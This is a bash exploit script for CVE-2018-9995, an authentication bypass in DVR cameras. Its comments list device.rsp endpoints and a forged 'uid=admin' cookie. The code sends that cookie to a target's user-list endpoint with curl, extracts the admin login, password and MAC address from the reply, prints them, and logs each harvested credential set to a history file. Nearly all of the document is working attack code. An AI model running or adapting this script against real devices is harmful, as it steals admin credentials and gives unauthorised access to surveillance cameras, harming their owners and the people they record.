#!/bin/bash
#
# https://www.yeahhub.com/exploitation-dvr-cameras-cve-2018-9995-tutorial/
#
#
# /device.rsp?opt=user&cmd=list
# /device.rsp?opt=changelanguage&language=1&url=http://www.google.com
# /device.rsp?opt=getInputVideoFormat
# /device.rsp?opt=sys&cmd=getdefaultparam
# /device.rsp?opt=3G&cmd=info
# /device.rsp?opt=sys&cmd=version
# /device.rsp?opt=user&cmd=ollist
# /device.rsp?opt=ethernet&cmd=dhcpip
# /device.rsp?opt=hdd&cmd=state&devmap=65535&_=1580313670588
# /device.rsp?opt=getLog&cmd=bypage&page=0&st=2018-08-01%2000:00:00&et=2020-01-29%2023:59:59&pagenum=7&type=3&mark=1&handle=
# /device.rsp?opt=record&cmd=calendar&chl=65535&stream=1&type=65535&year=2020&month=1
#
#
#full cookie:
#Cookie: userlan=1; language_ch=true; maxbol=true; EncodingVlaue=; Crole=2; backup=-1; opt=-1; playback=-1; ptz=-1; role=2; rview=-1; session=; uid=admin; view=-1
#
#
# /getparameter.json?REQ=%7B%22MODULE%22%3A%22CONFIGMODEL%22%2C%22OPERATION%22%3A%22GET%22%2C%22PARAMETER%22%3A%7B%22NWSM%22%3A%7B%22PORT%22%3A%7B%22PORTLIST%22%3A%5B%22%3F%22%2C%22%3F%22%5D%7D%7D%2C%22AVSM%22%3A%7B%22VIP%22%3A%5B%7B%22CRM%22%3A%22%3F%22%2C%22LUM%22%3A%22%3F%22%2C%22CONT%22%3A%22%3F%22%2C%22SAT%22%3A%22%3F%22%7D%2C%7B%22CRM%22%3A%22%3F%22%2C%22LUM%22%3A%22%3F%22%2C%22CONT%22%3A%22%3F%22%2C%22SAT%22%3A%22%3F%22%7D%2C%7B%22CRM%22%3A%22%3F%22%2C%22LUM%22%3A%22%3F%22%2C%22CONT%22%3A%22%3F%22%2C%22SAT%22%3A%22%3F%22%7D%2C%7B%22CRM%22%3A%22%3F%22%2C%22LUM%22%3A%22%3F%22%2C%22CONT%22%3A%22%3F%22%2C%22SAT%22%3A%22%3F%22%7D%5D%7D%2C%22SESSION%22%3A%2298190dc2-0890-4ef8-ac9a-5940995e6119%22%7D
#
##########################################################################################


if [ ${#1} -eq 0 ];then
	target_url='http://127.0.0.1/' #for example
else
	target_url="$1"
	proto=${target_url:0:4}''
	if [ "$proto" != "http" ];then
		target_url="http://$target_url"
	fi
	last_slash=$(echo "$target_url"|rev|cut -c 1|rev)
	if [ "$last_slash" = "/" ];then
		ts=$(( ${#target_url} - 1 ))
		target_url="${target_url:0:$ts}"
	fi
fi

commande_to_test='opt=user&cmd=list'
#commande_to_test='opt=sys&cmd=getdefaultparam'
#commande_to_test='opt=3G&cmd=info'
#commande_to_test='opt=sys&cmd=version'
#commande_to_test='opt=user&cmd=ollist'
#commande_to_test='opt=getLog&cmd=bypage&page=0&st=1900-08-01%2000:00:00&et=2050-01-29%2023:59:59&pagenum=1&type=3&mark=1&handle='
#commande_to_test='opt=record&cmd=calendar&chl=65535&stream=1&type=65535&year=2020&month=1'

admin_cookie='uid=admin'
full_target="$target_url/device.rsp?$commande_to_test"
script_name=$(echo "$0"|rev|cut -d "/" -f 1|rev)
output_filename="/tmp/$script_name.curlresults.tmp"
history_filename=""$(pwd)"/$script_name.history"

marge="\t"

#show info
echo -e "[+] Target_uri: $full_target"
echo -e "[+] Command: $commande_to_test"
echo -e "[+] Cookie: $admin_cookie"
echo -e "[+] Output filename: $output_filename*"
echo -e "[+] History filename: $history_filename*"

if [ "$2" = "--raw" ];then
	raw='true'
	echo -e "[+] Raw result: ON"
else
	raw='false'
fi


check_history=$(cat "$history_filename" 2>/dev/null |grep "$target_url"|tail -n 1)

if [ ${#check_history} -ne 0 ];then 
	hist_date=$(echo "$check_history"|cut -d ';' -f 2)
	hist_login=$(echo "$check_history"|cut -d ';' -f 3)
	hist_password=$(echo "$check_history"|cut -d ';' -f 4)
	echo "[+] Target already tested: $hist_date"
	echo " |_[-] $hist_login"
	echo " |_[-] $hist_password"
fi

echo -e "[+] Send request"
#sending request
curl -ks -b "$admin_cookie" "$full_target" -o "$output_filename"'_original'


if [ "$raw" = "false" ];then
	echo -e "[+] Formatting results"
	#format json
	cat "$output_filename"'_original'|sed "s/,/\n/g"|sed "s/{/\n/g"|sed "s/}/\n/g" > "$output_filename"'_2'
	#format fields
	cat "$output_filename"'_2'|sed 's/"uid":/"LOGIN":/g'|sed 's/"pwd":/"PASSWORD":/g'|sed 's/"mac":/"MAC ADDRESS":/g' > "$output_filename"'_3'

	#format punct
	cat "$output_filename"'_3'|sed 's/"//g' > "$output_filename"'_4' #|sed "s/\n/\n${marge}/g"

	#tabs mise en forme
	cat "$output_filename"'_4'|sed "s/^/\n${marge}/g" > "$output_filename"'_5'

	#filtering
	cat "$output_filename"'_5' |egrep -i 'LOGIN|PASSWORD|MAC ADDRESS'|sed "s/LOGIN/\n${marge}LOGIN/g" > "$output_filename"'_final'
	admin_login=$(cat "$output_filename"'_final'|sed 's/\t//g'|egrep -i 'LOGIN'|sed "s/LOGIN/Login/g"|head -n 1)
	admin_password=$(cat "$output_filename"'_final'|sed 's/\t//g'|egrep -i 'PASSWORD'|sed "s/PASSWORD/Password/g"|head -n 1)
else
	cat "$output_filename"'_original'|sed "s/,/\n/g"|sed "s/{/\n/g"|sed "s/}/\n/g" > "$output_filename"'_final'
	admin_login=$(cat "$output_filename"'_final' |egrep -i 'uid":"'|sed 's/"//g'|sed "s/uid/Login/g"|head -n 1)
	admin_password=$(cat "$output_filename"'_final'|egrep -i 'pwd":"'|sed 's/"//g'|sed "s/pwd/Password/g"|head -n 1)
fi

echo -e "[+] Showing results"
#show results and filtering
cat "$output_filename"'_final'
echo ''

#admin creds
if [ ${#admin_login} -gt 0 ];then
	echo -e "[+] Admin credentials"
	echo -e " |_[-] $admin_login\n |_[-] $admin_password"
else
	echo -e "[+] Device not vulnerable"
	echo -e " |_[-] No admin login found!"
	admin_login="No login found"
	admin_password="Not vulnerable"
fi
echo ''

echo -e "[+] Update history"
#save url
echo "$target_url;"$(date "+%d/%m/%Y %T")";$admin_login;$admin_password" >> "$history_filename"

echo -e "[+] Deleting temporary files"
rm -f "$output_filename"'*'

#exiting
echo -e "[+] Bye"
exit 0
